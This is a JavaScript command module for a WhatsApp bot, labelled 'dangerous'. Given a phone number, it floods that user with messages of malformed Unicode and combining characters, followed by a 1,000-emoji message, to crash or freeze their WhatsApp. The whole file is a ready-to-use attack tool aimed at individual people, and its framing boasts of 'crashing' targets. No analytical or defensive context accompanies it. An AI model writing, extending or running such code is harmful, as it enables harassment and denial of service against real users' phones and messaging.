export default {
  name: 'crash',
  description: 'Crash a user\'s WhatsApp with a bug',
  category: 'dangerous',
  aliases: ['crush', 'freeze'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ CRASH USER 〕━━━┈⊷
┃ Crash a user's WhatsApp with a bug.
┃ 
┃ Usage: ${prefix}crash <number>
┃ 
┃ Example: ${prefix}crash 27797352930
┃ 
┃ ⚠️ Use with caution!
┃ 🧛 "The darkness crashes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ CRASHING USER 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 
┃ 🧛 "The darkness crushes..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const crashMessages = [
        '‮⁦⁦⁦⁩⁩⁩',
        '‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦',
        '🫸🫷🫸🫷🫸🫷🫸🫷',
        '⁣‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌',
        '⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤',
        '̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸',
        '࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔',
        '𒀀𒀁𒀂𒀃𒀄𒀅𒀆𒀇𒀈',
        '꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂',
        '𖦹𖦺𖦻𖦼𖦽𖦾𖦿𖧀𖧁𖧂'
      ];

      for (let i = 0; i < 10; i++) {
        try {
          await sock.sendMessage(userJid, {
            text: crashMessages[i % crashMessages.length]
          });
          await new Promise(resolve => setTimeout(resolve, 200));
        } catch {}
      }

      let largeMessage = '';
      for (let i = 0; i < 1000; i++) {
        largeMessage += '🩸';
      }

      await sock.sendMessage(userJid, {
        text: largeMessage
      });

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ CRASH SENT 〕━━━┈⊷
┃ 👤 ${target} has been crashed!
┃ 
┃ 🧛 "The darkness crushes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
